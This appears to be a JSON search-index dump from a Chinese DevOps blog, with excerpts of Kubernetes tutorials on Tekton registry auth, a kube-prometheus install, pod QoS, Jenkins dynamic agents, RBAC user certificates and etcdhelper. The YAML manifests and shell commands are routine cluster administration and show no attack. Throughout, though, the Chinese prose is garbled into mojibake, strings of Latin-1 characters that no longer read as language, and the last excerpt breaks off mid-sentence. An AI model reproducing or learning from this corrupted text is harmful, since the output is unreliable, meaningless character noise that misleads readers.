¹æ®ä»gitä»“åº“çš„å†…å®¹è¿›è¡Œæ„å»ºé•œåƒå’Œæ¨é€é•œåƒ,ä½†å¦‚æœæ˜¯ç§æœ‰é•œåƒä»“åº“,è¯¥å¦‚ä½•è¿›è¡Œè®¤è¯æ“ä½œå‘¢ã€‚tektonæä¾›äº†ä¸¤ç§æ–¹å¼,åœ¨taskrunæˆ–è€…pipelinerunçš„æ—¶å€™å¯ä»¥é…ç½®serviceAccountNameã€‚å…·ä½“æ–¹å¼å¯ä»¥å‚è€ƒè¿™é‡Œ é™„å¸¦taskrunç¤ºä¾‹: apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: generateName: website-build- spec: serviceAccountName: aliyun-cr resources: inputs: - name: code resourceSpec: type: git params: - name: url value: https://github.com/soulchildwm/tekton-demo.git - name: revision value: python-website outputs: - name: builtImage resourceSpec: type: image params: - name: url value: registry.cn-shanghai.aliyuncs.com/soulchild/zero params: - name: dockerfileName value: ./Dockerfile taskRef: name: docker-build-push è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥æŠŠpipelineresourceä¹Ÿå†™åˆ°äº†taskruné‡Œ ","date":"2021-08-19 22:21","objectID":"/post/2627/:5:1","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["ç›‘æ§","kubernetes"],"content":"ä¸€ã€ä¸‹è½½ç¼–æ’æ–‡ä»¶ git clone https://github.com.cnpmjs.org/prometheus-operator/kube-prometheus.git cd kube-prometheus/manifests/ ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:1","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["ç›‘æ§","kubernetes"],"content":"äºŒã€éƒ¨ç½²operator crd k apply -f setup/ ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:2","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["ç›‘æ§","kubernetes"],"content":"ä¸‰ã€éƒ¨ç½²prometheus k apply -f . å¦‚æœéœ€è¦æ•°æ®æŒä¹…åŒ–,å¯ä»¥é…ç½®pvc,å‰ææ˜¯é›†ç¾¤æœ‰storage-class,ä¿®æ”¹prometheus-prometheus.yaml,åœ¨æœ€åè¿½åŠ å¦‚ä¸‹å†…å®¹ storage: volumeClaimTemplate: spec: storageClassName: nfs-storage resources: requests: storage: 50Gi ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:3","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["ç›‘æ§","kubernetes"],"content":"å››ã€è§£å†³æŠ¥é”™ 61451-s1tklrm78h9.png kube-state-metricsé•œåƒæ‹‰å–é”™è¯¯ï¼Œk describe pod -n monitoring kube-state-metrics-76f6cb7996-2nqpfæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ 31439-4w9umx1953p.png éœ€è¦è®¿é—®googleï¼Œemã€‚ã€‚ã€‚æˆ‘ä»æœ¬åœ°æ‹‰äº†ä¸€ä¸ªä¼ åˆ°é˜¿é‡Œäº‘é•œåƒä»“åº“äº†,é•œåƒåœ°å€: registry.cn-shanghai.aliyuncs.com/soulchild/kube-state-metrics:v2.0.0 ä¿®æ”¹é•œåƒ: k set image -n monitoring deployment kube-state-metrics kube-state-metrics=registry.cn-shanghai.aliyuncs.com/soulchild/kube-state-metrics:v2.0.0 éƒ¨ç½²å®Œæˆ 01998-qj8e0wb6xer.png ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:4","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["ç›‘æ§","kubernetes"],"content":"äº”ã€é…ç½®ingressæä¾›å¤–éƒ¨è®¿é—® apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: prometheus namespace: monitoring spec: rules: - host: prom.ops.cn http: paths: - pathType: Prefix path: \"/\" backend: service: name: prometheus-k8s port: name: web - host: alert.ops.cn http: paths: - pathType: Prefix path: \"/\" backend: service: name: alertmanager-main port: name: web - host: grafana.ops.cn http: paths: - pathType: Prefix path: \"/\" backend: service: name: grafana port: name: http ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:5","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["ç›‘æ§","kubernetes"],"content":"å…­ã€è§£å†³controllerManagerå’Œschedulerä¸èƒ½è‡ªåŠ¨å‘ç° kube-prometheusé»˜è®¤ä¼šåœ¨kube-systemå‘½åç©ºé—´ä¸‹æŸ¥æ‰¾controllerManagerå’Œschedulerçš„serviceå¯¹åº”çš„endpointä½œä¸ºtargetåœ°å€,ç”±äºæˆ‘æœ¬åœ°æ˜¯äºŒè¿›åˆ¶éƒ¨ç½²çš„é›†ç¾¤,å¹¶æ²¡æœ‰è¿™ä¸¤ä¸ªserviceå’Œep,æ‰€ä»¥éœ€è¦æ‰‹åŠ¨åˆ›å»ºä¸€ä¸‹ controller-manager: apiVersion: v1 kind: Service metadata: name: kube-controller-manager namespace: kube-system labels: app.kubernetes.io/name: kube-controller-manager spec: type: ClusterIP clusterIP: None ports: - name: https-metrics port: 10257 --- apiVersion: v1 kind: Endpoints metadata: name: kube-controller-manager namespace: kube-system labels: app.kubernetes.io/name: kube-controller-manager subsets: - addresses: - ip: 172.17.20.201 - ip: 172.17.20.202 - ip: 172.17.20.203 ports: - name: https-metrics port: 10257 protocol: TCP scheduler: apiVersion: v1 kind: Service metadata: name: kube-scheduler namespace: kube-system labels: app.kubernetes.io/name: kube-scheduler spec: type: ClusterIP clusterIP: None ports: - name: https-metrics port: 10259 --- apiVersion: v1 kind: Endpoints metadata: name: kube-scheduler namespace: kube-system labels: app.kubernetes.io/name: kube-scheduler subsets: - addresses: - ip: 172.17.20.201 - ip: 172.17.20.202 - ip: 172.17.20.203 ports: - name: https-metrics port: 10259 protocol: TCP ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:6","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["ç›‘æ§","kubernetes"],"content":"ä¸ƒã€è§£å†³CoreDnsä¸èƒ½è‡ªåŠ¨å‘ç° kube-prometheusåŒæ ·é€šè¿‡serviceæŸ¥æ‰¾corednsçš„epä½œä¸ºtarget,kube-prometheusåœ¨é€‰æ‹©serviceçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯app.kubernetes.io/name: kube-dnsè¿™æ ·çš„æ ‡ç­¾,ä½†æ˜¯æˆ‘éƒ¨ç½²çš„core-dnsæ²¡æœ‰è¿™ä¸ªæ ‡ç­¾ï¼Œæ‰€ä»¥éœ€è¦æ·»åŠ è¿™ä¸ªæ ‡ç­¾ k label service -n kube-system kube-dns app.kubernetes.io/name=kube-dns å¯ä»¥çœ‹åˆ°åˆšæ‰çš„å‡ ä¸ªç»„ä»¶éƒ½å¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº† 91045-yhbt1po8vz.png ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:7","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["ç›‘æ§","kubernetes"],"content":"å…«ã€è®¿é—®æµ‹è¯• grafanaçš„é»˜è®¤è´¦å·å¯†ç æ˜¯admin 79123-1epig03h6vr.png ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:8","tags":["k8s","prometheus"],"title":"kube-prometheuså®‰è£…éƒ¨ç½²(ä¸€)","uri":"/post/2613/"},{"categories":["kubernetes"],"content":"å®˜æ–¹æ–‡æ¡£: https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/ ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:0","tags":["k8s"],"title":"k8s ä¸­podçš„QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"å‰è¨€ åœ¨k8sä¸­å¯ä»¥è®¾ç½®requestå’Œlimitå¯¹Podè¿›è¡Œèµ„æºé™åˆ¶,ä¸åŒçš„è®¾ç½®æ–¹æ³•ä¼šå½±å“è¿™ä¸ªPodçš„QoSçº§åˆ«ã€‚ ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:1","tags":["k8s"],"title":"k8s ä¸­podçš„QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"QoSçº§åˆ«åˆ†ä¸ºä¸‰ç§: Guaranteed: Podä¸­çš„æ‰€æœ‰å®¹å™¨å¿…é¡»åŒæ—¶è®¾ç½®cpuå’Œmemoryçš„requestå’Œlimitï¼Œå¹¶ä¸”é™åˆ¶çš„å€¼è¦ç›¸åŒã€‚(è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯åªè®¾ç½®äº†limitæ²¡æœ‰è®¾ç½®request,è¿™ç§æƒ…å†µk8sä¼šè‡ªåŠ¨åŠ ä¸Šrequestçš„é™åˆ¶ï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µä¹Ÿå±äºGuaranteed) Burstable: ä¸æ»¡è¶³Guaranteedæ—¶,åªè¦è®¾ç½®äº†requestæˆ–è€…limitå°±æ˜¯è¿™ç§ç±»å‹ BestEffort: æ—¢æ²¡æœ‰è®¾ç½®requestä¹Ÿæ²¡æœ‰è®¾ç½®limit ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:2","tags":["k8s"],"title":"k8s ä¸­podçš„QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"ä¸‰ç§ç±»å‹çš„å½±å“ å½“å®¿ä¸»æœºèµ„æºä¸è¶³æ—¶,kubeletä¼šå¯¹Podè¿›è¡Œé©±é€(Eviction),é©±é€çš„é˜ˆå€¼åœ¨kubeletçš„evictionHardå­—æ®µä¸­é…ç½®ã€‚ å“ªäº›Podä¼šè¢«ä¼˜å…ˆé©±é€å°±å’ŒQoSç­‰çº§æœ‰å…³äº†,é©±é€çš„é¡ºåºå¦‚ä¸‹: BestEffort Burstable Guaranteed ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:3","tags":["k8s"],"title":"k8s ä¸­podçš„QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"ä¸€ã€åˆ›å»ºnamespace k create namespace devops ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:1","tags":["k8s","jenkins"],"title":"k8s éƒ¨ç½²jenkinså®ç°åŠ¨æ€slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"äºŒã€åˆ›å»ºPVC æˆ‘çš„k8sé›†ç¾¤å·²ç»é…ç½®è¿‡nfs-storageclassäº†,æ‰€ä»¥ä¸‹é¢åªåˆ›å»ºäº†pvcï¼Œpvæ˜¯è‡ªåŠ¨åˆ›å»ºçš„ apiVersion: v1 kind: PersistentVolumeClaim metadata: name: jenkins-pvc namespace: devops spec: storageClassName: nfs-storage accessModes: - ReadWriteOnce resources: requests: storage: 20Gi ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:2","tags":["k8s","jenkins"],"title":"k8s éƒ¨ç½²jenkinså®ç°åŠ¨æ€slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"ä¸‰ã€åˆ›å»ºServiceAccount --- apiVersion: v1 kind: ServiceAccount metadata: name: jenkins namespace: devops --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \"true\" labels: kubernetes.io/bootstrapping: rbac-defaults name: jenkins namespace: devops rules: - apiGroups: - \"\" resources: - pods - pods/log - pods/exec verbs: - create - get - watch - delete - list - patch - update - apiGroups: - \"\" resources: - secrets verbs: - get --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \"true\" labels: kubernetes.io/bootstrapping: rbac-defaults name: jenkins namespace: devops roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: jenkins subjects: - apiGroup: rbac.authorization.k8s.io kind: User # system:serviceaccounts:\u003cnamespaceåç§°\u003eè¡¨ç¤ºdevopså‘½åç©ºé—´çš„æ‰€æœ‰ServiceAccountï¼Œè¿™é‡Œç”¨åˆ°äº†k8sä¸­ä»¥ç”¨æˆ·ç»„çš„æ¦‚å¿µï¼Œå¦‚æœè¦ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œéœ€è¦å°†kindçš„å€¼æ”¹ä¸ºGroup #name: system:serviceaccounts:devops # ä¸‹é¢è¡¨è¾¾çš„æ„æ€æ˜¯devopså‘½åç©ºé—´ä¸‹çš„jenkins serviceaccount name: system:serviceaccount:devops:jenkins ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:3","tags":["k8s","jenkins"],"title":"k8s éƒ¨ç½²jenkinså®ç°åŠ¨æ€slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"å››ã€åˆ›å»ºDeployment å…³äºjenkinsé•œåƒè¯´æ˜: https://github.com/jenkinsci/docker/blob/master/README.md æ³¨æ„ç‚¹: jenkinså­˜å‚¨ç›®å½•åœ¨/var/jenkins_homeï¼Œæ‰€ä»¥éœ€è¦æŒä¹…åŒ–è¿™ä¸ªç›®å½• ç«¯å£æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯8080(webé¡µé¢),å¦ä¸€ä¸ªæ˜¯50000(agentç«¯å£) JVMå‚æ•°é€šè¿‡JAVA_OPTSç¯å¢ƒå˜é‡ä¿®æ”¹ apiVersion: apps/v1 kind: Deployment metadata: name: jenkins namespace: devops spec: replicas: 1 selector: matchLabels: app: jenkins template: metadata: labels: app: jenkins spec: containers: - name: jenkins image: jenkins/jenkins:lts-jdk11 imagePullPolicy: IfNotPresent ports: - name: web containerPort: 8080 - name: tcp containerPort: 50000 volumeMounts: - name: jenkins-home mountPath: /var/jenkins_home startupProbe: httpGet: path: /login port: web initialDelaySeconds: 60 periodSeconds: 10 successThreshold: 1 failureThreshold: 10 timeoutSeconds: 5 readinessProbe: httpGet: path: /login port: web initialDelaySeconds: 60 periodSeconds: 2 successThreshold: 1 failureThreshold: 2 timeoutSeconds: 5 livenessProbe: httpGet: path: /login port: web initialDelaySeconds: 60 periodSeconds: 2 successThreshold: 1 failureThreshold: 2 timeoutSeconds: 5 volumes: - name: jenkins-home persistentVolumeClaim: claimName: jenkins-pvc ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:4","tags":["k8s","jenkins"],"title":"k8s éƒ¨ç½²jenkinså®ç°åŠ¨æ€slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"äº”ã€åˆ›å»ºService æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™jnlpå®¹å™¨æŠ¥é”™:java.nio.channels.UnresolvedAddressExceptionï¼ŒæŸ¥è¯¢èµ„æ–™å‘ç°jenkins-webçš„åœ°å€è¦å’Œjenkins-agentçš„åœ°å€ä¸€æ ·,æ‰€ä»¥webå’Œagentè¦ä½¿ç”¨åŒä¸€ä¸ªserviceï¼Œä½†æ˜¯æˆ‘ä¸æƒ³æŠŠjenkins-agentçš„ç«¯å£æš´éœ²åœ¨é›†ç¾¤å¤–ï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘åˆ›å»ºäº†ä¸¤ä¸ªserviceï¼Œä¸€ä¸ªæ˜¯æä¾›jenkins-webçš„å¤–éƒ¨è®¿é—®(åªåŒ…å«web)ï¼Œä¸€ä¸ªç”¨äºé›†ç¾¤å†…éƒ¨è®¿é—®(åŒ…å«webå’Œagent) apiVersion: v1 kind: Service metadata: name: jenkins-web namespace: devops spec: type: NodePort ports: - name: web port: 8080 targetPort: 8080 selector: app: jenkins --- apiVersion: v1 kind: Service metadata: name: jenkins namespace: devops spec: type: ClusterIP ports: - name: web port: 8080 targetPort: 8080 - name: agent port: 50000 targetPort: 50000 selector: app: jenkins ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:5","tags":["k8s","jenkins"],"title":"k8s éƒ¨ç½²jenkinså®ç°åŠ¨æ€slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"å…­ã€è®¿é—®æµ‹è¯• æŸ¥çœ‹nodeportç«¯å£ k get svc -n devops jenkins-web -o jsonpath={.spec.ports[*].nodePort} 31375-uocot4fdnh.png æŸ¥çœ‹åˆå§‹å¯†ç  k logs -n devops --selector=app=jenkins --tail=100 |egrep '^([0-9]|[a-zA-Z]){32}' ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:6","tags":["k8s","jenkins"],"title":"k8s éƒ¨ç½²jenkinså®ç°åŠ¨æ€slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"7ã€é…ç½®åŠ¨æ€slave(è¯·è‡ªè¡Œå®‰è£…kubernetesæ’ä»¶) ** 1.æŸ¥çœ‹jenkins serviceaccount token ** k get secret -n devops $(k get sa -n devops jenkins -o jsonpath={.secrets[0].name}) -o jsonpath={.data.token} |base64 -d ;echo ** 2.åˆ›å»ºjenkinså‡­æ® ** 22840-ngajm3rzzwj.png 65046-vg7a39pfnl.png ** å°†ç¬¬ä¸€æ­¥çš„tokenå¡«å…¥åˆ°secretå³å¯ ** 79630-uzprr44r3a8.png ** 3.é…ç½®kubernetesæ’ä»¶ ** 41961-i2ldor2m4g.png 37873-z5k2ofaw81c.png 60773-z6gmpfbqjw.png 86260-g1ioxstsg29.png ** è¿æ¥æµ‹è¯•åï¼Œæ˜¾ç¤ºConnected to kubernetes v1.xx.xå³æ­£å¸¸ ** 97210-3ngztdum8vc.png 28033-ixci6olfhk9.png æœ€åä¿å­˜å³å¯ã€‚ ** 4.é…ç½®Podæ¨¡æ¿ ** 40796-686soldwlzq.png 66722-eowqak1olbf.png è¿™é‡Œåªé…ç½®äº†æœ€åŸºæœ¬çš„å†…å®¹,é»˜è®¤æƒ…å†µä¸‹kubernetesæ’ä»¶ä¼šåŒ…å«ä¸€ä¸ªjnlpçš„å®¹å™¨,ç”¨äºè¿æ¥åˆ°jenkins master,ä¿å­˜åè¿›è¡Œä¸€ä¸ªç®€å•çš„æµ‹è¯• ** 5.æµ‹è¯• ** åˆ›å»ºä¸€ä¸ªjob 12280-iydbah0rend.png 42410-shiawppa6ub.png æ„å»ºè¿‡ç¨‹ä¸­jenkinsä¼šåœ¨k8sä¸­åˆ›å»ºjenkins-slave-xx podä½œä¸ºèŠ‚ç‚¹,å¹¶åœ¨è¿™ä¸ªèŠ‚ç‚¹ä¸­è¿è¡Œæˆ‘ä»¬æŒ‡å®šçš„å‘½ä»¤ 95982-ssnxl1r5cn.png æ„å»ºç»“æœ 79562-yr0morispgc.png ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:7","tags":["k8s","jenkins"],"title":"k8s éƒ¨ç½²jenkinså®ç°åŠ¨æ€slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"å‰è¨€ åˆ›å»ºä¸€ä¸ªsoulchildç”¨æˆ·ï¼Œè®©ä»–å¯ä»¥è®¿é—®defaultå‘½åç©ºé—´çš„podå’Œæ—¥å¿—.åˆ›å»ºç”¨æˆ·è¯ä¹¦ä½¿ç”¨çš„æ˜¯cfsslå·¥å…· ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:1","tags":["k8s"],"title":"k8s rbacåˆ›å»ºä¸€ä¸ªUserå¹¶èµ‹äºˆä»–æŒ‡å®šçš„æƒé™","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"ä¸€ã€ä¸ºç”¨æˆ·ç”Ÿæˆè¯ä¹¦ 1.åˆ›å»ºcfssl apiè¯·æ±‚å†…å®¹ cat \u003e soulchild.json \u003c\u003cEOF { \"CN\": \"soulchild\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"O\": \"ops\" } ] } EOF CN:ä»£è¡¨ç”¨æˆ·å O: ä»£è¡¨ç»„å 2.ç”Ÿæˆè¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json -profile kubernetes soulchild.json | cfssljson -bare soulchild cfsslçš„é…ç½®å¯æŸ¥çœ‹https://soulchild.cn/2462.html 3.ç”Ÿæˆè¯ä¹¦åä½¿ç”¨curlè®¿é—®æµ‹è¯• curl -k https://master:6443/api/v1/namespaces/kube-system/pods --cert ./soulchild.pem --key ./soulchild-key.pem 17545-95zajvjudnd.png å¯ä»¥çœ‹åˆ°æç¤ºsoulchildç”¨æˆ·ä¸èƒ½åœ¨kube-systemå‘½åç©ºé—´åˆ—å‡ºæ ¸å¿ƒapiç»„ä¸­çš„podsèµ„æº,å› ä¸ºæˆ‘ä»¬æ²¡æœ‰é…ç½®æƒé™,ä½†æ˜¯ä»–å·²ç»å¯ä»¥è¯†åˆ«åˆ°soulchildç”¨æˆ·äº†,è¿™æ˜¯æˆ‘ä»¬é¢„æœŸçš„ç»“æœã€‚ä¸‹é¢æˆ‘ä»¬å»é…ç½®æƒé™ ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:2","tags":["k8s"],"title":"k8s rbacåˆ›å»ºä¸€ä¸ªUserå¹¶èµ‹äºˆä»–æŒ‡å®šçš„æƒé™","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"äºŒã€åˆ›å»ºRole(è§’è‰²) åˆ›å»ºä¸€ä¸ªåœ¨kube-systemå‘½åç©ºé—´ä¸‹åªèƒ½æ‰§è¡Œlistã€getã€watchæ“ä½œçš„è§’è‰²ã€‚ apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: readonly-pod namespace: kube-system rules: - apiGroups: [\"\"] resources: [\"pods\", \"pods/log\"] resourceNames: [] verbs: - list - get - watch apiGroups: è¦æ§åˆ¶å“ªäº›apiç»„çš„æƒé™ï¼Œâ€œâ€œä»£è¡¨æ ¸å¿ƒapiç»„ verbs: å¯ä»¥æ‰§è¡Œçš„æ“ä½œæƒé™,ç›®å‰æ”¯æŒçš„é€‰é¡¹åŒ…æ‹¬[\"list\", \"get\", \"watch\", \"delete\", \"patch\", \"create\", \"update\" ] resources: verbsæƒé™å¯¹å“ªç§èµ„æºç±»å‹ç”Ÿæ•ˆ resourceNames: è®¾ç½®å¯¹å“ªä¸ªå…·ä½“çš„èµ„æºç”Ÿæ•ˆ,æ¯”å¦‚å¯ä»¥æŒ‡å®šä¸€ä¸ªpodåç§°,ä»£è¡¨åªèƒ½æŸ¥çœ‹è¿™ä¸€ä¸ªpodã€‚ç©ºæ•°ç»„ä»£è¡¨æ‰€æœ‰ã€‚è®¾ç½®è¿™ä¸ªçš„å‰ææ˜¯å¿…é¡»å¯¹è¿™ä¸ªå…·ä½“èµ„æºçš„èµ„æºç±»å‹æœ‰æƒé™ ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:3","tags":["k8s"],"title":"k8s rbacåˆ›å»ºä¸€ä¸ªUserå¹¶èµ‹äºˆä»–æŒ‡å®šçš„æƒé™","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"ä¸‰ã€åˆ›å»ºRoleBinding ç”¨æˆ·å’Œæƒé™éƒ½å·²ç»æœ‰äº†ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦å°†æƒé™å’Œç”¨æˆ·å…³è”èµ·æ¥ apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: readonly-pod-binding namespace: kube-system subjects: - kind: User name: soulchild roleRef: kind: Role name: readonly-pod apiGroup: rbac.authorization.k8s.io subjects.kind: ç”¨æˆ·ç±»å‹ï¼Œå¯ä»¥æ˜¯User,Group,ServiceAccount subjects.name: ç”¨æˆ·åç§° roleRef.Role: å¼•ç”¨çš„èµ„æºç±»å‹,ä»…æ”¯æŒRoleå’ŒClusterRoleé€‰é¡¹.å› ä¸ºä¹‹å‰æˆ‘ä»¬åˆ›å»ºçš„æ˜¯Role,æ‰€ä»¥è¿™é‡Œé…ç½®çš„Role roleRef.name: å¼•ç”¨çš„èµ„æºåç§°,å³Roleæˆ–è€…ClusterRoleçš„åç§° roleRef.apiGroup: å¼•ç”¨çš„apiç»„,å³Roleæˆ–è€…ClusterRoleçš„apiç»„ ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:4","tags":["k8s"],"title":"k8s rbacåˆ›å»ºä¸€ä¸ªUserå¹¶èµ‹äºˆä»–æŒ‡å®šçš„æƒé™","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"å››ã€æµ‹è¯•æƒé™ # è·å–kube-systemå‘½åç©ºé—´ä¸‹çš„æ‰€æœ‰podåç§° curl -k -s https://172.17.20.200:6443/api/v1/namespaces/kube-system/pods/ --cert ./soulchild.pem --key ./soulchild-key.pem | jq -c '.items[]?.metadata.name' 28590-xbayz0qsj8q.png ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:5","tags":["k8s"],"title":"k8s rbacåˆ›å»ºä¸€ä¸ªUserå¹¶èµ‹äºˆä»–æŒ‡å®šçš„æƒé™","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"äº”ã€ä½¿ç”¨kubeconfigè®¿é—® # è®¾ç½®ç”¨æˆ·å‡­è¯ k config set-credentials soulchild --client-certificate ./soulchild.pem --client-key ./soulchild-key.pem --embed-certs # è®¾ç½®ä¸Šä¸‹æ–‡ k config set-context soulchild --cluster kubernetes --user soulchild --namespace kube-system # è®¿é—®æµ‹è¯• k get pod --context soulchild è¿™é‡Œç•™ä¸ªå¤‡å¿˜: ä½¿ç”¨serviceaccountåˆ›å»ºç”¨æˆ·æ—¶ï¼Œå¯ä»¥ä½¿ç”¨k config set-credentials soulchild â€“token=xxxxxæ·»åŠ ç”¨æˆ· 84825-3a5h4w52x66.png ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:6","tags":["k8s"],"title":"k8s rbacåˆ›å»ºä¸€ä¸ªUserå¹¶èµ‹äºˆä»–æŒ‡å®šçš„æƒé™","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"é¡¹ç›®åœ°å€: https://github.com/openshift/origin k8så­˜åœ¨etcdä¸­çš„æ•°æ®æ˜¯ç»è¿‡protobufåºåˆ—åŒ–çš„,ç›´æ¥æŸ¥çœ‹ä¼šå­˜åœ¨ä¹±ç çš„æƒ…å†µ,ä½¿ç”¨etcdhelperå¯è§£å†³è¿™ä¸ªé—®é¢˜ ","date":"2021-07-20 14:42","objectID":"/post/2584/:0:0","tags":["k8s","etcd"],"title":"ä½¿ç”¨etcdhelperæŸ¥è¯¢etcdä¸­k8sçš„èµ„æºæ•°æ®","uri":"/post/2584/"},{"categories":["kubernetes"],"content":"ä¸€ã€ç¼–è¯‘å®‰è£… # æ‹‰å–ä»£ç  git clone --depth 1 https://github.com/openshift/origin.git # è·¨å¹³å°ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶(æˆ‘æ˜¯macç³»ç»Ÿ,ç¼–è¯‘æˆlinuxå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶) CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build tools/etcdhelper/etcdhelper.go # å¦‚æœä½ æ˜¯windows,è¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build tools/etcdhelper/etcdhelper.go # å°†ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶ç¨‹åºæ”¾å…¥ç³»ç»Ÿç¯å¢ƒå˜é‡å¯è¯†åˆ«çš„åœ°æ–¹ mv etcdhelper /usr/local/bin/ è¿™é‡Œæœ‰ä¸€ä¸ªæˆ‘å·²ç»ç¼–è¯‘å¥½çš„: http://soulchild.cn/down/etcdhelper ","date":"2021-07-20 14:42","objectID":"/post/2584/:0:1","tags":["k8s","etcd"],"title":"ä½¿ç”¨etcdhelperæŸ¥è¯¢etcdä¸­k8sçš„èµ„æºæ•°æ®","uri":"/post/2584/"},{"categories":["kubernetes"],"content":"äºŒã€ä½¿ç”¨ ç”¨aliasèµ·ä¸ªåˆ«å,æ–¹ä¾¿ä½¿ç”¨ # è¿™é‡Œendpointä¸å¯ä»¥å†™å¤šèŠ‚ç‚¹ echo 'alias etcdhelper=\"etcdhelper -endpoint https://172.17.20.201:2379 -cacert /etc/kubernetes/pki/ca/ca.pem -key /etc/kubernetes/pki/etcd/etcd-key.pem -cert /etc/kubernetes/pki/etcd/etcd.pem\"' \u003e\u003e ~/.bashrc source ~/.bashrc ä½¿ç”¨æ–¹æ³•: # æŸ¥çœ‹keyåˆ—è¡¨ etcdhelper ls # æŸ¥çœ‹keyçš„value etcdhelper get /registry/pods/default/my-pod ","date":"2021-07-20 14:42","objectID":"/post/2584/:0:2","tags":["k8s","etcd"],"title":"ä½¿ç”¨etcdhelperæŸ¥è¯¢etcdä¸­k8sçš„èµ„æºæ•°æ®","uri":"/post/2584/"},{"categories":["kubernetes"],"content":"1ã€åˆ›å»ºPodæµç¨‹ 51776-nrhsb54bti.png å›¾ç‰‡æ¥æº: heptio.com å®¢æˆ·ç«¯å°†åˆ›å»ºPodçš„è¯·æ±‚å‘é€ç»™Apiserver Apiserverå°†Podä¿¡æ¯å†™å…¥etcd,etcdå°†å†™å…¥ç»“æœå“åº”ç»™Apiserver,Apiserverå°†åˆ›å»ºç»“æœå“åº”ç»™å®¢æˆ·ç«¯(æ­¤æ—¶Podå¤„äºPendingçŠ¶æ€) Scheduleré€šè¿‡Apiserverçš„watchæ¥å£,è·å–åˆ°æœªè°ƒåº¦çš„Podçš„é€šçŸ¥,æ 